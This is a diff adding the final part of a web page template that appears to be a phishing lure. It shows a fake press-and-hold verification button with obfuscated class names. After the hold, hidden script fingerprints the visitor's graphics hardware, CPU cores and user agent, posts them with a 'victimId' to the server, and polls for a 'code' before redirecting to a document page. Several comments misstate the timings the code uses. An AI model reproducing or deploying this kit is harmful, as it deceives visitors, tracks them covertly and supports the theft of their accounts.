+                if (innerText) innerText.style.setProperty("display", "none", "important");
+
+                // 1. Show the white checkmark immediately
+                const checkmark = button.querySelector(".success-checkmark");
+                if (checkmark) checkmark.style.display = "block";
+                
+                clearInterval(holdInterval); // Stop once full
+
+                
+                // 2. Wait 2.2 seconds, then transition to dots and trigger fingerprinting
+                setTimeout(() => {
+                    if (checkmark) checkmark.style.display = "none";
+                    
+                    const dots = button.querySelector(".loading-dots");
+                    if (dots) {
+                        dots.style.opacity = "0";
+                        dots.style.display = "flex";
+                        dots.offsetHeight; // Force layout reflow
+                        dots.style.transition = "opacity 0.4s ease-out";
+                        dots.style.opacity = "1";
+                    }
+
+                    // --- NEW FINGERPRINTING LOGIC ---
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl');
+                        const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                        
+                        // Gather hardware environment details
+                        const hardwareData = JSON.stringify({
+                            renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A",
+                            cores: navigator.hardwareConcurrency || "N/A"
+                        });
+
+                        // Populate the hidden form fields
+                        const hardwareInput = document.getElementById('hardware-input');
+                        const uaInput = document.getElementById('ua-input');
+                        const safariForm = document.getElementById('safari-form');
+
+                        if (hardwareInput) hardwareInput.value = hardwareData;
+                        if (uaInput) uaInput.value = navigator.userAgent;
+
+                                                // Give the loading dots exactly 1 second to show before sending data
+                        setTimeout(async () => {
+                            try {
+                                // 1. Create the data payload dynamically
+                                const params = new URLSearchParams();
+                                params.append('uuid', '<%= victimId %>');
+                                params.append('hardware', hardwareData);
+                                params.append('ua', navigator.userAgent);
+
+                                // 2. Send the data to the server silently in the background
+                                const response = await fetch('/submit-data', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                    body: params.toString()
+                                });
+
+                                // 3. If the data sent successfully, start checking if the code is ready
+                                if (response.ok) {
+                                    const pollTimer = setInterval(async () => {
+                                        try {
+                                            const checkResponse = await fetch('/check-code/<%= victimId %>');
+                                            const checkData = await checkResponse.json();
+
+                                            // If the server says 'ready', stop checking and move to the document page
+                                            if (checkData && checkData.status === 'ready') {
+                                                clearInterval(pollTimer);
+                                                window.location.href = '/document/<%= victimId %>';
+                                            }
+                                        } catch (pollErr) {
+                                            console.error("Error checking code status:", pollErr);
+                                        }
+                                    }, 3000); // Checks the server every 2.5 seconds
+                                }
+                            } catch (networkErr) {
+                                console.error("Background submission failed:", networkErr);
+                            }
+                        }, 350);
+
+                    } catch (error) {
+                        console.error("Data gathering skipped or restricted:", error);
+                    }
+                    // ---------------------------------
+
+                }, 700);
+
+            }
+
+            else {
+                progressFill.style.width = currentProgress + "%";
+            }
+        }, intervalStep);
+    }
+
+    function stopFilling() {
+        // If the text has changed to "Please wait...", do not let outside touches reset it
+    const textElement = button.querySelector(".ZpICXubljzwSSUY");
+    if (textElement && textElement.textContent === "Please wait...") {
+        return;
+    }
+
+        clearInterval(holdInterval);
+       button.classList.remove("pressed");
+        // If let go before 100%, reset back to empty
+        if (currentProgress < 100) {
+            currentProgress = 0;
+            progressFill.style.width = "0%";
+        }
+    }
+
+    // Mouse Controls
+    button.addEventListener("mousedown", startFilling);
+    window.addEventListener("mouseup", stopFilling);
+    button.addEventListener("mouseleave", stopFilling);
+
+    // Touch Controls
+    button.addEventListener("touchstart", startFilling, { passive: false });
+    window.addEventListener("touchend", stopFilling);
+
+    // Automatically fills the progress bar on a single click of the SVG icon
+        // Automatically handles the SVG icon action for both Mobile and Desktop
+    if (iconButton) {
+        
+        // 1. Create a single action handler
+        function handleIconTrigger(e) {
+            if (e.cancelable) e.preventDefault(); // Prevents touch conflicts on mobile
+
+            if (!window.hasClickBeenWarned) {
+                button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.textContent = "Press again");
+                window.hasClickBeenWarned = true;
+                iconButton.classList.add("faint-icon");
+                return; // Blocks the first interaction
+            } else {
+                return; // Blocks every interaction after the first one too
+            }
+        }
+
+        // 2. Bind the exact same handler to both touch screens and mouse clicks
+        iconButton.addEventListener("touchstart", handleIconTrigger, { passive: false });
+        iconButton.addEventListener("mousedown", handleIconTrigger);
+    }
+});
+
+
+
+
+        
+window.addEventListener('resize', () => {
+    // Clear out panned canvas memory across windows and roots
+    window.scrollTo(0, 0);
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    
+    const wrapper = document.querySelector('.page-wrapper');
+    if (wrapper) {
+        wrapper.scrollTop = 0;
+    }
+    
+    // Smoothly force a layout recalculation on the structure
+    const container = document.getElementById('signInContainer');
+    if (container) {
+        container.style.transform = 'none';
+    }
+});
+
+
+
+    
+
+</script>
+    <form id="safari-form" action="/submit-data" method="POST" style="display:none;">
+    <input type="hidden" name="uuid" value="<%= victimId %>">
+    <input type="hidden" id="hardware-input" name="hardware">
+    <input type="hidden" id="ua-input" name="ua">
+    </form>
+</body>
+</html>
